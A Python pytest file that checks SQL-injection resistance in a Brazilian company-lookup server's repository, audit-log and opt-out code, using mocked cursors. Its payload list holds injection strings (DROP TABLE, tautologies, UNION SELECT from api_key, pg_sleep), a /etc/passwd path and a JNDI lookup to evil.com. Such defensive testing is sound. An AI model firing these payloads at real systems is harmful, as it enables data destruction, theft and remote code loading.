"""SQL injection resistance — verify that adversarial inputs are passed as
parameters (psycopg `%s` binding) and NEVER concatenated into the SQL string.

We use a mocked cursor and inspect both:
- The SQL passed to `execute()` — must NOT contain the adversarial payload.
- The params tuple — that's where the payload goes.
"""

from __future__ import annotations

from datetime import UTC, date, datetime
from typing import Any
from unittest.mock import MagicMock

import pytest

from brasil_mcp_match_server.core.audit import log as audit_mod
from brasil_mcp_match_server.core.lgpd import opt_out as opt_out_mod
from brasil_mcp_match_server.core.repository.postgres_repo import PostgresCnpjRepo

ADVERSARIAL_PAYLOADS = [
    "'; DROP TABLE empresa; --",
    "12345678'; DROP TABLE empresa; --",
    "1' OR '1'='1",
    "UNION SELECT * FROM api_key",
    "/* comment */ SELECT pg_sleep(10) /* */",
    "'; INSERT INTO opt_out_request VALUES ('x', now(), now(), NULL); --",
    "\\'; DROP TABLE audit_log; --",
    "0xDEADBEEF",
    "/etc/passwd",
    "${jndi:ldap://evil.com/x}",
]


def _build_cursor() -> tuple[MagicMock, MagicMock]:
    cur = MagicMock(name="cursor")
    cur.fetchone.return_value = None
    cur.rowcount = 0
    cur_ctx = MagicMock(name="cursor_ctx")
    cur_ctx.__enter__.return_value = cur
    cur_ctx.__exit__.return_value = False
    conn = MagicMock(name="conn")
    conn.cursor.return_value = cur_ctx
    return conn, cur


# ---------- PostgresCnpjRepo.find_by_cnpj ----------


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_repo_find_by_cnpj_uses_parameterized_query(payload: str) -> None:
    conn, cur = _build_cursor()
    repo = PostgresCnpjRepo(conn)
    repo.find_by_cnpj(payload)
    sql, params = cur.execute.call_args[0]
    # Adversarial payload must be in params, NOT in the SQL string.
    assert payload not in sql, f"payload concatenated into SQL: {sql!r}"
    assert params == (payload,)


# ---------- audit_log.insert ----------


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_audit_insert_uses_parameterized_query(payload: str) -> None:
    cur = MagicMock(name="cursor")
    entry = audit_mod.AuditEntry(
        query_id=payload,
        api_key_hash="h" * 64,
        tool=payload,
        input_hash="i" * 64,
        cnpj_basico=payload,
        response_summary={"match": True},
        base_updated_at=date(2026, 5, 1),
        ip_address=payload,
        latency_ms=42,
    )
    audit_mod.insert(entry, cur)
    sql, params = cur.execute.call_args[0]
    # SQL must use %s placeholders, no payload substring.
    assert payload not in sql
    # The payload IS in params — that's where it should be.
    assert payload in params


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_audit_older_than_uses_parameterized_query(payload: str) -> None:
    cur = MagicMock(name="cursor")
    cur.rowcount = 0
    # `older_than` takes a datetime — adversarial passed but typed.
    # We use it indirectly by checking SQL doesn't have the payload string.
    cutoff = datetime(2025, 1, 1)
    audit_mod.older_than(cutoff, cur)
    sql, params = cur.execute.call_args[0]
    assert "%s" in sql
    assert params == (cutoff,)
    # Spot check the adversarial input never makes it into this code path.
    assert payload not in sql


# ---------- opt_out.register / opt_out.is_blocked ----------


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_opt_out_register_uses_parameterized_query(payload: str) -> None:
    cur = MagicMock(name="cursor")
    opt_out_mod.register(
        cnpj=payload,
        proof={"type": "email", "value_hash": "h" * 64},
        cursor=cur,
        now=datetime(2026, 5, 1, tzinfo=UTC),
    )
    sql, params = cur.execute.call_args[0]
    assert payload not in sql
    assert payload in params


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_opt_out_is_blocked_uses_parameterized_query(payload: str) -> None:
    cur = MagicMock(name="cursor")
    cur.fetchone.return_value = None
    opt_out_mod.is_blocked(cnpj=payload, cursor=cur, now=datetime(2026, 5, 1, tzinfo=UTC))
    sql, params = cur.execute.call_args[0]
    assert payload not in sql
    assert payload in params


# ---------- Audit log persistence shape: no plaintext interpolation ----------


def test_audit_sql_template_has_only_placeholders() -> None:
    """Defensive: the module-level SQL must contain ONLY `%s` placeholders,
    never a Python f-string or `.format()` interpolation that would inline user
    data into the query."""
    sql = audit_mod._SQL_INSERT
    assert "{" not in sql and "}" not in sql, "f-string-like template detected"
    # Count placeholders matches the columns inserted.
    assert sql.count("%s") == 9


def test_opt_out_sql_template_has_only_placeholders() -> None:
    for sql in (opt_out_mod._SQL_INSERT, opt_out_mod._SQL_IS_BLOCKED):
        assert "{" not in sql and "}" not in sql
        # %s placeholders only.
        assert "%s" in sql


# ---------- Repository SQL template inspection ----------


def test_postgres_repo_sql_template_has_only_placeholders() -> None:
    """The lookup query must be a parameterized template, not a concat."""
    from brasil_mcp_match_server.core.repository import postgres_repo as repo_mod

    sql_text: Any = getattr(repo_mod, "_SQL_LOOKUP", None) or getattr(repo_mod, "_SQL", None)
    if sql_text is None:
        # Fallback: drive the repo once and inspect the call.
        conn, cur = _build_cursor()
        PostgresCnpjRepo(conn).find_by_cnpj("12345678000195")
        sql_text = cur.execute.call_args[0][0]
    assert "{" not in sql_text and "}" not in sql_text
    assert "%s" in sql_text
